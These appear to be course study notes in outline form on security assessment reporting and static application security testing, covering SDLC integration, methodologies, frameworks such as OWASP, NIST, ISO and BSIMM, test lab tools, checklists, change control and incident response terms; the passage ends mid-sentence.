&nbsp;				□ Responsible for reallocating staff, hiring, purchasing licenses, updating security documentation, and coordinating communication.

&nbsp;				□ Their focus: logistics, timelines, and resourcing.

&nbsp;			§ Staff (technical detail):

&nbsp;				□ Network admins, sysadmins, developers.

&nbsp;				□ Need specific remediation steps and technical details to implement fixes.

&nbsp;				□ Their focus: execution and hands-on remediation.

&nbsp;			§ Tailoring the Report

&nbsp;				□ One report → three perspectives.

&nbsp;				□ Ensure the draft speaks to all audiences before delivery.



Delivering Your Report

&nbsp;	• Delivering a security assessment report should be a staged, client-focused process that ensures alignment with expectations, engages stakeholders, and provides both findings and context to maximize impact.

&nbsp;	• Key Concepts

&nbsp;		○ Map Report to Statement of Work (SOW)

&nbsp;			§ Every item in the report should trace back to the client’s original request.

&nbsp;			§ Ensures the final deliverable aligns with expectations and scope.

&nbsp;		○ Deliver in Stages

&nbsp;			§ Stage 1 – Draft Review Meeting

&nbsp;				□ Share a polished draft (well-formatted, free of spelling errors).

&nbsp;				□ Primary goal: give client contact a chance to respond, correct, or refine.

&nbsp;				□ Include client-specific details (culture, challenges) to increase relevance.

&nbsp;			§ Stage 2 – Final Delivery Meeting

&nbsp;				□ Include key stakeholders since they will be most impacted.

&nbsp;				□ Be prepared for tension (e.g., internal power struggles) that could shape how findings are received.

&nbsp;		○ Provide Context Alongside Findings

&nbsp;			§ Don’t just deliver vulnerabilities and technical issues.

&nbsp;			§ Explain why findings matter, how they impact the organization, and how fixes will benefit the business, employees, and customers.

&nbsp;			§ “Context is everything.”

&nbsp;		○ Follow Secure Data Handling Procedures

&nbsp;			§ Use your established data handling plan (secure storage, transmission, access).

&nbsp;			§ Only then mark the assessment as complete.

#### Additional Resources



📚 Recommended Books

&nbsp;	• RTFM: The Red Team Field Manual

&nbsp;	• BTFM: The Blue Team Field Manual

&nbsp;	• Hash Crack: The Password Cracking Manual

&nbsp;	• Penetration Testing: A Hands-On Introduction to Hacking



📑 Key NIST Publications

&nbsp;	• SP 800-30 Rev 1 – Guide for Conducting Risk Assessments

&nbsp;	• SP 800-53 Rev 5 – Security and Privacy Controls for Federal Information Systems and Organizations

&nbsp;	• NIST Cybersecurity Framework (CSF)

&nbsp;	• (Previously referenced: SP 800-115 – Technical Guide to Information Security Testing and Assessment)



👥 Professional Organizations

&nbsp;	• ISSA – issa.org

Great for security generalists.

&nbsp;	• ISACA – isaca.org

Focused on IT auditors and cross-functional discussions.

&nbsp;	• ISC² – isc2.org

Certification body for CISSP, CSSLP, etc.

&nbsp;	• InfraGard – infragard.org

Public-private sector collaboration in the U.S.

&nbsp;	• OWASP – owasp.org

Focus on application and web security.



🎤 Conferences \& Events

&nbsp;	• InfoSec Conferences – infosec-conferences.com

&nbsp;	• BSides Security Conferences – securitybsides.com

Affordable, community-run conferences.

&nbsp;	• YouTube Security Talks – irongeek.com (Adrian Crenshaw’s recordings)



📡 Stay Connected

&nbsp;	• LinkedIn Learning Courses – by Jerod

&nbsp;	• Simplifying Cybersecurity (LinkedIn page for ongoing updates)





---------------------------------------------------------------------------------------------------------------------------------------------------------------------------



### Static Application Security Testing (SAST)

#### Leading Practices



Security in the SDLC

&nbsp;	• Security must be integrated into the Software Development Life Cycle (SDLC) in a way that aligns with developers’ priorities and workflows. This is best achieved by breaking security into manageable touchpoints, starting with static testing, and balancing technical, organizational, and market considerations.

&nbsp;	• Key Concepts

&nbsp;		○ SDLC Overview

&nbsp;			§ Three stages: Conceptualize → Develop → Release.

&nbsp;			§ From a developer’s perspective, security often feels like an afterthought or burden unless properly integrated.

&nbsp;		○ Developer Perspective

&nbsp;			§ Developers face competing priorities, deadlines, and unclear requirements.

&nbsp;			§ Adding “make it secure” without guidance increases stress.

&nbsp;			§ Security professionals should “seek first to understand” developers’ challenges.

&nbsp;		○ Four Security Touchpoints in the SDLC

&nbsp;			§ Documentation review: Ensure contracts and third-party work include security requirements.

&nbsp;			§ Source code review: Identify vulnerabilities early.

&nbsp;			§ QA process review: Confirm security tests are included.

&nbsp;			§ Deployed application review: Test for exploitable weaknesses post-release.

&nbsp;		○ Static Testing

&nbsp;			§ Focuses on documentation and code review, with some overlap into QA.

&nbsp;			§ Advantages:

&nbsp;				□ Cheaper to fix issues before production.

&nbsp;				□ More effective when built-in early vs. bolted-on later.

&nbsp;				□ Low-risk because it doesn’t disrupt production systems.

&nbsp;			§ Balance in Security Testing

&nbsp;				□ Consider developer workflows, market pressures (e.g., release deadlines, outsourcing), and team skill levels.

&nbsp;				□ Don’t assume skills—assess strengths/weaknesses of both developers and testers.

&nbsp;				□ Design tests that respect these constraints to ensure adoption and effectiveness.

&nbsp;			§ Outcome

&nbsp;				□ A balanced, integrated approach reduces both the likelihood and impact of security vulnerabilities.

&nbsp;				□ Security becomes part of the development culture, not an afterthought.



Development Methodologies

&nbsp;	• Understanding application development methodologies is essential for integrating security testing effectively. Since different organizations and teams use different frameworks, security professionals must adapt their approach to fit the chosen methodology.

&nbsp;	• Key Concepts

&nbsp;		○ Why Methodologies Matter

&nbsp;			§ Methodologies = frameworks that define how teams plan, build, and deploy applications.

&nbsp;			§ They are especially critical for large-scale teams where orchestration is required.

&nbsp;			§ Security integration depends on the methodology in use.

&nbsp;		○ Four Popular Methodologies

&nbsp;			§ Waterfall (Structured \& Sequential)

&nbsp;				□ Origin: Popularized by the U.S. DoD in the 1980s.

&nbsp;				□ Process: Phased approach — Requirements → Design → Implementation → Testing → Integration → Deployment → Maintenance.

&nbsp;				□ Security Fit: Straightforward — embed security requirements in each phase and perform checks between phases.

&nbsp;			§ Agile (Iterative \& Flexible)

&nbsp;				□ Origin: Agile Manifesto (2001) with 4 key values:

&nbsp;					® Individuals \& interactions > processes \& tools

&nbsp;					® Working software > comprehensive documentation

&nbsp;					® Customer collaboration > contract negotiation

&nbsp;					® Responding to change > following a plan

&nbsp;				□ Process: Continuous iteration \& prototyping; no rigid phases.

&nbsp;				□ Security Fit: Harder to test at the end of phases (since they don’t exist). Security must adapt to iteration cycles.

&nbsp;			§ Rapid Application Development (RAD)

&nbsp;				□ Hybrid of Waterfall and Agile.

&nbsp;				□ Front-loads data modeling \& business process modeling to define requirements.

&nbsp;				□ Then adopts iterative prototyping similar to Agile.

&nbsp;				□ Security Fit: More difficult than Waterfall, but feasible through code security reviews rather than heavy documentation.

&nbsp;			§ DevOps (Cross-functional \& Continuous)

&nbsp;				□ Origin: Term coined in 2009, popularized by The Phoenix Project.

&nbsp;				□ Brings development + IT operations together.

&nbsp;				□ Focus: Speed, collaboration, and ongoing changes/maintenance.

&nbsp;				□ Subset: DevSecOps integrates security directly into DevOps processes.

&nbsp;				□ Security Fit: Security must be part of continuous delivery and collaboration.

&nbsp;			§ Other Methodologies

&nbsp;				□ Variants exist (e.g., Scrum, Extreme Programming under Agile).

&nbsp;				□ Important to recognize that different teams use different methods, and some may blend approaches.

&nbsp;			



Programming Languages

&nbsp;	• Security testers must understand the landscape of programming languages because static application security testing (SAST) depends on the language an application is written in. You don’t need to master every language, but you should be familiar with the most common ones and their distinctions.

&nbsp;	• Key Concepts

&nbsp;		○ Variety of Programming Languages

&nbsp;			§ Like methodologies, developers have many programming languages to choose from.

&nbsp;			§ Analogy: Rosetta Stone → multiple languages expressing the same message.

&nbsp;			§ Today, instead of 3, there are hundreds to thousands of languages.

&nbsp;		○ Impact on Security Testing

&nbsp;			§ Different languages require different testing tools for static code analysis.

&nbsp;			§ SAST effectiveness depends on choosing tools that match the application’s language.

&nbsp;		○ Focus on Popular Languages

&nbsp;			§ You don’t need to be an expert in every language.

&nbsp;			§ Apply the 80/20 rule: ~80% of code reviewed will be written in ~20% of the most popular languages.

&nbsp;			§ GitHub Octoverse Report provides data on the most widely used languages.

&nbsp;			§ GitHub is also a useful platform for:

&nbsp;				□ Developer collaboration.

&nbsp;				□ Finding open-source code to practice security testing techniques.

&nbsp;		○ Distinctions Between Languages

&nbsp;			§ Critical to recognize differences between languages (e.g., Java vs. JavaScript).

&nbsp;			§ Confusing them damages credibility with developers and can invalidate tests.

&nbsp;		○ Language Generations

&nbsp;			§ Programming languages evolved by generation:

&nbsp;				□ Early generations → closer to hardware (machine code, assembly).

&nbsp;				□ Later generations → easier to read, easier to write (high-level languages).

&nbsp;			§ Understanding this helps put modern languages in context.

&nbsp;		○ Preparation for Testing

&nbsp;			§ Testers must build familiarity with the programming languages they’ll encounter.

&nbsp;			§ Knowing language characteristics is prerequisite to effective SAST.



Security Frameworks

&nbsp;	Security frameworks provide accumulated best practices for integrating security into application development and testing. Instead of starting from scratch, security testers can leverage established frameworks and compliance standards to guide their static application security testing (SAST).

&nbsp;	• Key Concepts

&nbsp;		○ Purpose of Security Frameworks

&nbsp;			§ Frameworks represent accumulated security knowledge (standing on “shoulders of giants”).

&nbsp;			§ They guide how to align functional goals of developers (make it work) with defensive goals of security professionals (make it safe).

&nbsp;			§ Nearly all major frameworks already include application security requirements.

&nbsp;		○ Four Recommended Security Frameworks

&nbsp;			§ ISO/IEC 27000 series

&nbsp;				□ Collection of information security standards.

&nbsp;				□ Common reference: ISO 27001 (ISMS).

&nbsp;				□ Highly practical: ISO 27002 (2022) — 93 controls, grouped into:

&nbsp;					® Organizational

&nbsp;					® People

&nbsp;					® Physical

&nbsp;					® Technological

&nbsp;			§ NIST Cybersecurity Framework (CSF)

&nbsp;				□ US NIST publications consolidated into a cybersecurity/risk management approach.

&nbsp;				□ 108 controls grouped into 5 functions:

&nbsp;					® Identify

&nbsp;					® Protect

&nbsp;					® Detect

&nbsp;					® Respond

&nbsp;					® Recover

&nbsp;				□ COBIT (Control Objectives for Information and Related Technology)

&nbsp;					® Created by ISACA.

&nbsp;					® Broader IT governance focus.

&nbsp;					® Includes application security controls linked to governance/IT controls.

&nbsp;				□ CIS Critical Security Controls

&nbsp;					® From the Center for Internet Security.

&nbsp;					® Provides prioritized, maturity-based controls, tailored to resources \& expertise.

&nbsp;					® Unlike others, CIS explicitly prioritizes which controls to address first.

&nbsp;		○ Compliance Standards vs. Security Frameworks

&nbsp;			§ Frameworks: Provide guidance/best practices.

&nbsp;			§ Compliance Standards: Impose mandatory rules; failure = penalties.

&nbsp;		○ Examples:

&nbsp;			§ Financial: Sarbanes-Oxley (SOX), Gramm-Leach-Bliley Act (GLBA).

&nbsp;			§ Healthcare: HIPAA (Health Insurance Portability and Accountability Act).

&nbsp;			§ Payments: PCI DSS (Payment Card Industry Data Security Standard).

&nbsp;			§ Privacy: GDPR (EU), CCPA (California), PIPEDA (Canada).

&nbsp;		○ Practical Application

&nbsp;			§ Use frameworks and compliance standards as foundation for building security testing strategies.

&nbsp;			§ Then leverage OWASP for tactical, technical guidance on how to perform tests.



The OWASP Top 10

&nbsp;	• OWASP (Open Web Application Security Project) is a leading nonprofit in application security, and its Top 10 Project is the most recognized resource for identifying and mitigating the most critical web application security risks. The OWASP Top 10 provides not just a list but also actionable threat modeling and remediation guidance.

&nbsp;	• Key Concepts

&nbsp;		○ About OWASP

&nbsp;			§ A nonprofit foundation focused on improving application security globally.

&nbsp;			§ Provides a wide range of open-source projects, tools, and documentation.

&nbsp;			§ Projects are categorized as:

&nbsp;				□ Flagship Projects: Mature, strategic, widely adopted (e.g., OWASP Top 10).

&nbsp;				□ Production Projects: Production-ready, still a growing category.

&nbsp;				□ Other Projects: Tools, documentation, or experimental/playground projects (some may evolve into higher status).

&nbsp;		○ The OWASP Top 10 Project

&nbsp;			§ Flagship project and OWASP’s most well-known contribution.

&nbsp;			§ First published in 2003.

&nbsp;			§ Official version-controlled updates began in 2004, with a commitment to refresh every three years.

&nbsp;			§ A committee of professionals reviews and updates the list based on the evolving threat landscape.

&nbsp;		○ Structure and Content of the Top 10

&nbsp;			§ The Top 10 list itself is concise, but the white paper adds depth:

&nbsp;				□ Explains why each risk matters.

&nbsp;				□ Provides methods for identifying and remediating vulnerabilities.

&nbsp;				□ Offers threat modeling guidance:

&nbsp;					® Threat agents (who may attack).

&nbsp;					® Attack vectors (how they attack).

&nbsp;					® Security controls to mitigate risks.

&nbsp;					® Technical and business impacts if successful.

&nbsp;		○ Importance of the Top 10

&nbsp;			§ Serves as a practical, widely accepted baseline for web application security.

&nbsp;			§ Translates academic or theoretical security issues into real-world attack scenarios.

&nbsp;			§ Freely available — lowering the barrier for developers and security teams to adopt best practices.

&nbsp;			§ Acts as a foundation for security testing, including static application security testing (SAST).



Other Notable Projects

&nbsp;	• While the OWASP Top 10 is the most famous, OWASP offers many other powerful resources and tools that support both static and dynamic application security testing. These projects provide guides, frameworks, and tools that help testers, developers, and organizations mature their security programs.

&nbsp;	• Key Concepts

&nbsp;		○ OWASP Web Security Testing Guide (WSTG)

&nbsp;			§ 200+ page PDF with detailed guidance.

&nbsp;			§ Organizes tests into 11 categories with 100+ individual tests.

&nbsp;			§ Provides instructions on tools and techniques.

&nbsp;			§ Used to build a baseline security profile before penetration testing.

&nbsp;			§ One of the most valuable resources for security testers.

&nbsp;		○ OWASP Code Review Guide

&nbsp;			§ 220 pages of detailed guidance.

&nbsp;			§ Explains why code reviews matter and what to look for.

&nbsp;			§ Includes code examples tied to OWASP Top 10 risks.

&nbsp;			§ Helps developers answer: “How exactly do we perform a code security review?”

&nbsp;		○ OWASP ZAP (Zed Attack Proxy)

&nbsp;			§ Web application proxy + vulnerability scanner.

&nbsp;			§ Allows testers to capture and manipulate traffic between client and server.

&nbsp;			§ Includes an automated vulnerability scanner (not as deep as commercial tools, but still effective).

&nbsp;			§ Any vulnerabilities it finds should be taken seriously.

&nbsp;		○ OWTF (Offensive Web Testing Framework)

&nbsp;			§ Aimed at penetration testers.

&nbsp;			§ Automates many web app security tests.

&nbsp;			§ Combines knowledge from:

&nbsp;				□ OWASP Testing Guide

&nbsp;				□ Penetration Testing Execution Standard (PTES)

&nbsp;				□ NIST guidance

&nbsp;			§ Goal: automate basic tests so testers can focus on complex ones.

&nbsp;		○ OWASP SAMM (Software Assurance Maturity Model)

&nbsp;			§ Provides a maturity model for software assurance.

&nbsp;			§ Based on five business functions:

&nbsp;				□ Governance

&nbsp;				□ Design

&nbsp;				□ Implementation

&nbsp;				□ Verification

&nbsp;				□ Operations

&nbsp;			§ Each function has three security practices, scored by maturity.

&nbsp;			§ Produces a clear picture of application security gaps.

&nbsp;		○ How to Use These Projects

&nbsp;			§ For static testing:

&nbsp;				□ Incorporate Testing Guide, Code Review Guide, and SAMM.

&nbsp;			§ For dynamic testing:

&nbsp;				□ Use Testing Guide again (applies to both static/dynamic).

&nbsp;				□ Use ZAP and OWTF for automation.

&nbsp;		○ OWASP Community Value

&nbsp;			§ OWASP continuously publishes and updates projects.

&nbsp;			§ All resources are free and extremely valuable.

&nbsp;			§ Testers and developers should:

&nbsp;				□ Leverage them in daily work.

&nbsp;				□ Contribute back to projects or share with security groups.

&nbsp;				□ Stay updated on new and evolving projects.



Top 25 Software Errors

&nbsp;	• The SANS Institute and MITRE Corporation collaborated to create the Top 25 Most Dangerous Software Errors, a resource that goes beyond the OWASP Top 10 by providing a deeper and broader look at software vulnerabilities. This list, grounded in MITRE’s CWE (Common Weakness Enumeration), gives security testers and developers more detailed insights into common coding errors, and practical ways to integrate them into Agile development.

&nbsp;	• Key Concepts

&nbsp;		○ Background on SANS Institute

&nbsp;			§ Founded in 1989, major provider of cybersecurity training and research.

&nbsp;			§ Known for multi-day training courses worldwide.

&nbsp;			§ Established GIAC certifications to validate practitioner skills in security.

&nbsp;		○ Background on MITRE

&nbsp;			§ Not-for-profit, federally funded R\&D organization.

&nbsp;			§ Works across defense, intelligence, homeland security, and cybersecurity.

&nbsp;			§ Maintains the CWE (Common Weakness Enumeration):

&nbsp;				□ A standardized “common language” for describing software weaknesses.

&nbsp;				□ Helps unify how vulnerabilities are defined and addressed.

&nbsp;		○ The Top 25 Software Errors

&nbsp;			§ In 2010, SANS + MITRE partnered to publish the Top 25 Most Dangerous Software Errors.

&nbsp;			§ Based on CWE data, but prioritized by severity and prevalence.

&nbsp;			§ More detailed than OWASP Top 10:

&nbsp;				□ Broader scope, deeper insights into software security risks.

&nbsp;			§ Limitation: Unlike OWASP Top 10, it’s not updated with the same consistency/due diligence.

&nbsp;		○ Practical Application in Agile Development

&nbsp;			§ Stephen Dye (AppSec expert \& CISO) authored “Secure Agile Development: 25 Security User Stories.”

&nbsp;			§ Combines the Top 25 errors with Agile methodology.

&nbsp;			§ Each error is mapped into a security user story format, including:

&nbsp;				□ Clear descriptions (developer-friendly language).

&nbsp;				□ Test steps.

&nbsp;				□ Acceptance criteria.

&nbsp;			§ Purpose: Helps developers integrate security testing naturally into Agile workflows.\\

&nbsp;		○ Importance for Security Testing

&nbsp;			§ OWASP Top 10 = baseline risks, widely adopted.

&nbsp;			§ SANS/MITRE Top 25 = deeper, broader coverage of dangerous coding errors.

&nbsp;			§ Using both helps testers and developers:

&nbsp;				□ Gain better coverage of risks.

&nbsp;				□ Communicate in a shared language (via CWE, Agile stories).

&nbsp;				□ Embed security earlier and more effectively.



BSIMM (Building Security in Maturity Model)

&nbsp;	• The BSIMM (Building Security in Maturity Model) provides a structured, maturity-based approach to improving software security. Unlike compliance frameworks, BSIMM helps organizations move beyond “checking the box” to addressing the root causes of vulnerabilities through systematic practices across governance, intelligence, software security touchpoints, and deployment.

&nbsp;	• Key Concepts

&nbsp;		○ Why BSIMM Matters

&nbsp;			§ Created by 100+ organizations across industries (heavily influenced by financial services and software vendors).

&nbsp;			§ Similar to OWASP SAMM, but broader and more industry-backed.

&nbsp;			§ Emphasizes: “Compliance ≠ Security” — real security comes from maturity.

&nbsp;			§ Vulnerabilities = symptoms, not the root problem → BSIMM focuses on addressing root causes.

&nbsp;		○ Structure of BSIMM

&nbsp;			§ 121 activities, grouped by:

&nbsp;				□ Three maturity levels:

&nbsp;					® Level 1 → basic activities.

&nbsp;					® Level 2 → intermediate.

&nbsp;					® Level 3 → mature, advanced.

&nbsp;				□ 12 practices within four domains.

&nbsp;		○ The Four Domains

&nbsp;			§ Governance (organize, manage, measure)

&nbsp;				□ Strategy \& Metrics → roles, responsibilities, budgets, KPIs.

&nbsp;				□ Compliance \& Policy → internal/external standards (e.g., HIPAA, PCI DSS).

&nbsp;				□ Training → build shared knowledge, common security language.

&nbsp;			§ Intelligence (create reusable artifacts)

&nbsp;				□ Attack Models → view from attacker’s perspective to prioritize risks.

&nbsp;				□ Security Features \& Design → reusable secure design patterns.

&nbsp;				□ Standards \& Requirements → technical control documentation building on policies.

&nbsp;			§ SSDL Touchpoints (hands-on security in SDLC)

&nbsp;				□ Architecture Analysis → validate diagrams and system design.

&nbsp;				□ Code Review → multiple roles, tools, and perspectives to catch flaws early.

&nbsp;				□ Security Testing → vulnerability analysis (static → informs dynamic).

&nbsp;			§ Deployment (secure release \& post-production)

&nbsp;				□ Penetration Testing → test if controls withstand attacks.

&nbsp;				□ Software Environment → OS, WAF, monitoring, change management.

&nbsp;				□ Configuration \& Vulnerability Management → patching, updates, defect \& incident management.

&nbsp;			§ Practical Use

&nbsp;				□ Recommended approach: start with one domain at a time to avoid overwhelm.

&nbsp;				□ BSIMM provides a roadmap for organizations to gauge current maturity, identify gaps, and improve systematically.

&nbsp;				□ Ties together governance, design, static/dynamic testing, and operations → full lifecycle coverage.



Building Your Test Lab

&nbsp;	• To perform effective static (and later dynamic) application security testing, you need a lightweight but well-prepared test lab. This involves using virtual machines, static code analysis tools, IDEs, and ultimately a structured checklist to ensure consistency and repeatability in testing.

&nbsp;	• Key Concepts

&nbsp;		○ Test Lab Setup with Virtual Machines

&nbsp;			§ Virtual Machines (VMs) provide an isolated, flexible environment for testing.

&nbsp;			§ Benefits: Easy to spin up, reset, and restore.

&nbsp;			§ Options:

&nbsp;				□ VMware Workstation Player: Popular, requires a license for commercial use.

&nbsp;				□ Oracle VirtualBox: Free, but sometimes requires extra configuration.

&nbsp;		○ Static Testing Focus

&nbsp;			§ While much static testing involves documentation review, hands-on code review is still critical.

&nbsp;			§ Requires tools that can scan and analyze source code for vulnerabilities.

&nbsp;		○ Core Static Code Analysis Tools

&nbsp;			§ Codacy:

&nbsp;				□ Cloud-based or enterprise edition.

&nbsp;				□ Integrates with GitHub/Bitbucket to analyze code on every commit or pull request.

&nbsp;				□ Detects quality and security issues.

&nbsp;			• SonarQube:

&nbsp;				□ Larger user base, similar to Codacy.

&nbsp;				□ Community Edition is free for local use.

&nbsp;				□ SonarCloud available for online code inspection.

&nbsp;			• Both tools provide broad language support and can serve as central pieces of the testing toolkit.

&nbsp;		○ Integrated Development Environments (IDEs)

&nbsp;			• IDEs are the tools developers use to write, test, and debug code.

&nbsp;			• Examples:

&nbsp;				□ Visual Studio (popular for .NET).

&nbsp;				□ Eclipse (common for Java).

&nbsp;			• Many IDEs now support multiple languages.

&nbsp;			• Security plugins exist for IDEs, allowing developers to secure code as they write it, making them an important part of proactive security.

&nbsp;		○ Next Step – Testing Checklist

&nbsp;			• Beyond tools, testers need a checklist.

&nbsp;			• Purpose:

&nbsp;				□ Ensure a consistent, repeatable testing process.

&nbsp;				□ Wrap together frameworks, maturity models (like SAMM \& BSIMM), and static testing tools.

&nbsp;			• This checklist bridges knowledge into practice, providing structure and reliability.



Preparing Your Checklist

&nbsp;	• A testing checklist is essential for creating a repeatable, consistent, and measurable static application security testing (SAST) process. By including pre-engagement activities, clearly defined scope, and alignment with organizational practices, the checklist ensures reliable results that improve security over time.

&nbsp;	• Key Concepts

&nbsp;		○ Purpose of a Checklist

&nbsp;			• A one-time test provides insights, but a checklist ensures repeatability and consistency.

&nbsp;			• Helps testers measure improvement across time.

&nbsp;			• Supports continuous security validation, not just compliance or busywork.

&nbsp;			• Ultimate goals of testing:

&nbsp;				□ Protect confidential data.

&nbsp;				□ Maintain application integrity.

&nbsp;				□ Ensure availability/reliability for users.

&nbsp;		○ Measurement and Metrics

&nbsp;			• Security tests should be results-driven.

&nbsp;			• Measuring outcomes helps determine if testing efforts are effective.

&nbsp;			• Fine-tuning the process is necessary as applications evolve.

&nbsp;			• Metrics will be covered in more depth later in the course.

&nbsp;		○ Pre-Engagement Interactions

&nbsp;			• Checklist should not start with tests — preparation is critical.

&nbsp;			• Pre-engagement activities determine success of testing.

&nbsp;			• Key components:

&nbsp;				□ Scope verification: What’s in scope vs. out of scope.

&nbsp;				□ Testing time frames: Static testing offers more flexibility than dynamic testing.

&nbsp;				□ Tools \& techniques: Document in advance and review with developers.

&nbsp;		○ Five Key Questions to Answer Before Testing

&nbsp;			• What development methodologies do we follow? (e.g., Waterfall, Agile, DevOps)

&nbsp;			• What programming languages do we use? (impacts SAST tools needed)

&nbsp;			• What risk or security frameworks do we follow? (ISO, NIST, CIS, etc.)

&nbsp;			• What third-party libraries do we use? (open-source dependency risks)

&nbsp;			• What stages in the development process require approval from security? (integration points for security reviews)

&nbsp;		○ Principle: “Measure Twice, Cut Once”

&nbsp;			• Jumping into tests without preparation risks missing issues.

&nbsp;			• Pre-engagement = “measuring twice.”

&nbsp;			• Reduces mistakes and increases efficiency of the testing phase.



#### Security Documentation



`Internal Project Plans

&nbsp;	• Integrating static application security testing (SAST) into internal project plans—especially for new deployments and significant changes—is an effective way to reduce remediation costs, improve security outcomes, and ensure security is treated as a core requirement alongside functionality and quality.

&nbsp;	• Key Concepts

&nbsp;		○ When to Use Project Plans for Security

&nbsp;			§ Waterfall: Common practice, naturally fits.

&nbsp;			§ Agile: Still useful, though lighter weight.

&nbsp;			§ DevOps: Different pace, but planning has value.

&nbsp;			§ Best fit scenarios:

&nbsp;				□ Brand new deployments → If it didn’t exist yesterday and will tomorrow, treat it as new.

&nbsp;				□ Significant changes → Indicators:

&nbsp;					® Adding entirely new functionality.

&nbsp;					® Rewriting code in a different programming language.

&nbsp;		○ Cost Savings of Early Security

&nbsp;			§ Forrester (2016): Fixing defects earlier saves 5–15x remediation costs.

&nbsp;			§ US-CERT guidance (historical): Security assurance ties closely with project management discipline.

&nbsp;		○ Embedding Security into the SDLC

&nbsp;			§ Requirement gathering: Document security requirements alongside functional ones.

&nbsp;			§ Design phase: Security should analyze designs as a malicious user would, feeding into dynamic test cases.

&nbsp;			§ Development phase:

&nbsp;				□ Perform source code security reviews (not just code reviews).

&nbsp;				□ Favor automated reviews, triggered on check-ins or even while a developer is away.

&nbsp;			§ Clarity \& Accountability in Security Tasks

&nbsp;				□ For each task, answer:

&nbsp;					® What is the task? → Define clearly, manual vs automated, and expected outcome.

&nbsp;					® Who is responsible? → Ensure individual accountability, not shared.

&nbsp;					® When is it due? → Set deadlines or tie to dependencies.

&nbsp;		○ Role of the Security Tester

&nbsp;			§ If you’re the tester (not PM), take initiative:

&nbsp;				□ Meet with the project/product manager to identify security touchpoints.

&nbsp;				□ Focus on static tests that add maximum value with minimal effort.

&nbsp;				□ Stress that security = quality.

&nbsp;				□ Advocate for automated source code security reviews as the ultimate goal.



Communication Planning

&nbsp;	• Effective communication and integration of security testing into an organization’s change control process is essential. Without structured planning, changes can unintentionally introduce security flaws. By understanding policies, procedures, and stakeholders—and adapting to models like ITIL or CI/CD—security testing can be embedded into every change cycle to reduce risk.

&nbsp;	• Key Concepts

&nbsp;		○ Importance of Change Control

&nbsp;			§ Organizations implement change control policies to reduce the risk of system/application issues from changes.

&nbsp;			§ Without structured control, changes are more likely to cause unexpected impacts.

&nbsp;			§ Security-related flaws (e.g., SQL injection, insecure data exposure) may go unnoticed by users but exploited by attackers.

&nbsp;			§ Security testing must be included in every scheduled change.

&nbsp;		○ Stakeholders in Change Control

&nbsp;			§ End users → directly impacted by changes.

&nbsp;			§ Developers → authors and maintainers of the code being changed.

&nbsp;			§ IT Infrastructure teams → support servers, networks, and databases underpinning applications.

&nbsp;			§ IT Audit teams → verify adherence to change processes.

&nbsp;		○ Policy vs. Procedures

&nbsp;			§ Change Control Policy → high-level rules.

&nbsp;			§ Procedures → detailed steps for:

&nbsp;				□ Proposing changes.

&nbsp;				□ Reviewing changes.

&nbsp;				□ Testing changes (before and after implementation).

&nbsp;			§ Must align with technical standards and security guidelines (e.g., 2FA must never be disabled).

&nbsp;		○ ITIL (Information Technology Infrastructure Library)

&nbsp;			§ Widely used framework for IT change control.

&nbsp;			§ Defines types of changes:

&nbsp;				□ Emergency

&nbsp;				□ Standard

&nbsp;				□ Major

&nbsp;				□ Normal

&nbsp;			§ Introduces CAB (Change Advisory Board) → cross-functional group to review potential impacts of changes.

&nbsp;		○ CI/CD vs. Traditional ITIL

&nbsp;			§ CI/CD pipelines focus on speed and automation:

&nbsp;				□ Automated security scans (e.g., SAST in pipeline).

&nbsp;				□ Code tested, compiled, and deployed without lengthy approvals.

&nbsp;			§ Contrasts with ITIL’s formal, review-heavy processes.

&nbsp;			§ Modern DevOps requires adapting security testing to frequent, rapid releases.

&nbsp;		○ Security Testing Alignment

&nbsp;			§ To integrate effectively:

&nbsp;				□ Understand how your organization promotes changes (ITIL vs. CI/CD).

&nbsp;				□ Choose the right security tools and techniques for that environment.

&nbsp;				□ Embed static and dynamic security testing into every change cycle.



Change Control Policy

&nbsp;	• An effective communication plan is essential when integrating static application security testing into projects. Clear, role-based, and audience-appropriate communication keeps everyone aligned, ensures that flaws are remediated promptly, and helps maintain project flow without unnecessary delays or misunderstandings.

&nbsp;	• Key Concepts

&nbsp;		○ Purpose of a Communication Plan

&nbsp;			§ Keeps everyone on the same page.

&nbsp;			§ Ensures awareness of testing activities, findings, and remediations.

&nbsp;			§ Helps coordinate impacts on schedules, resources, and responsibilities.

&nbsp;			§ Static testing is low-risk for production, but findings can still affect timelines.

&nbsp;		○ Core Questions to Answer

&nbsp;			§ Who is impacted?

&nbsp;				□ Identify roles (PMs, developers, testers, analysts, auditors).

&nbsp;				□ Best practice: use names, emails, and phone numbers.

&nbsp;			§ How are they impacted?

&nbsp;				□ PMs need high-level status (“task done or not”).

&nbsp;				□ Developers need detailed remediation instructions and deadlines.

&nbsp;			§ Workflow Considerations

&nbsp;				□ Clarify in advance:

&nbsp;					® Who performs testing.

&nbsp;					® How much time testing adds (minimize via automation).

&nbsp;					® Who reviews results (ideally a second set of eyes).

&nbsp;					® Who signs off on fixes/remediation.

&nbsp;				□ These roles/tasks should already be documented in the project plan.

&nbsp;		○ Communication Styles \& Channels

&nbsp;			§ Traditional methods: Weekly meetings, task-tracking emails.

&nbsp;			§ Agile methods: Daily standup meetings (short, focused).

&nbsp;			§ Modern tools: Real-time messaging (e.g., Slack) → quick feedback loops.

&nbsp;			§ Best practice: adapt communication to the team’s preference to improve adoption.

&nbsp;		○ Best Practices

&nbsp;			§ Always communicate from the audience’s perspective.

&nbsp;			§ Clearly state:

&nbsp;				□ Expectations.

&nbsp;				□ Required actions.

&nbsp;				□ Acknowledgment/completion signals (so tasks don’t fall through the cracks).

&nbsp;			§ Avoid assumptions (e.g., sending an email without ensuring it was read/understood).



Security Incident Response Policy

&nbsp;	• Security incident response policies define how organizations prepare for and respond to threats. By understanding these policies—and the distinctions between events, incidents, and breaches—application security testers can better design static testing activities, align with organizational priorities, and involve the right stakeholders.

&nbsp;	• Key Concepts

&nbsp;		○ Terminology Matters

&nbsp;			§ Security Event → A logged activity (success/failure, benign or suspicious).

&nbsp;			§ Security Incident → Analyzed event(s) that confirm an active threat requiring action.

&nbsp;			§ Security Breach → A subset of incidents involving data loss or exposure.

&nbsp;				□ Example: DoS = incident, but not necessarily a breach.

&nbsp;		○ CIA Triad (Impact Categories)

&nbsp;			§ Most security incidents affect one of three areas:

&nbsp;				□ Confidentiality → Unauthorized disclosure of data.

&nbsp;				□ Integrity → Unauthorized alteration of data.

&nbsp;				□ Availability → Denial of access or service outages.

&nbsp;			§ Connection to Static Application Security Testing (SAST)

&nbsp;				□ SAST exists to find and fix vulnerabilities before attackers exploit them.

&nbsp;				□ Reviewing your org’s incident response policies informs:

